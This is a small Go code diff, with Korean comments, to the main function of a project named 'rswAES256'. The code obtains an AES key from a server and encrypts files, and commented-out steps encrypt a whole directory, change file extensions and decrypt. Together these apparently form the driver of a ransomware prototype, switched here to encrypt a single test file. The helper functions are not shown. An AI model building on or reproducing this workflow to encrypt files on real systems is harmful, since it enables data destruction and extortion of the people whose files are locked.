@@ -6,6 +6,7 @@ import (
 	"log"
 	"rswAES256/client"
 	"rswAES256/config"
+	"rswAES256/encrypt"
 )
 
 var path = "./config.toml"
@@ -31,10 +32,10 @@ func main() {
 	fmt.Println("Key from server : ", *key)
 
 	// roothPath의 하위 파일들을 암호화 함.
-	err = newClient.AESEncryptDirectory("./test/")
-	if err != nil {
-		log.Fatalln(err)
-	}
+	//err = newClient.AESEncryptDirectory("./test/")
+	//if err != nil {
+	//	log.Fatalln(err)
+	//}
 
 	// AES 암호화
 	//cipherText, err := encrypt.EncryptAES(data, []byte(*key))
@@ -43,12 +44,17 @@ func main() {
 	//}
 	//fmt.Printf("cipherText : %x\n", cipherText)
 
-	//// 파일 암호화
-	//err = encrypt.EncryptFile("test.txt", []byte(*key))
+	// 파일 암호화
+	err = encrypt.EncryptFile("./test.txt", []byte(*key))
+	if err != nil {
+		log.Fatalln(err)
+	}
+
+	// 파일 확장자 변경
+	//err = newClient.ChangeFileExtension("./test.txt")
 	//if err != nil {
 	//	log.Fatalln(err)
 	//}
-	//time.Sleep(time.Second * 5)
 
 	// 파일 복호화
 	//err = decrypt.DecryptFile("./test/abc.go", []byte(*key))
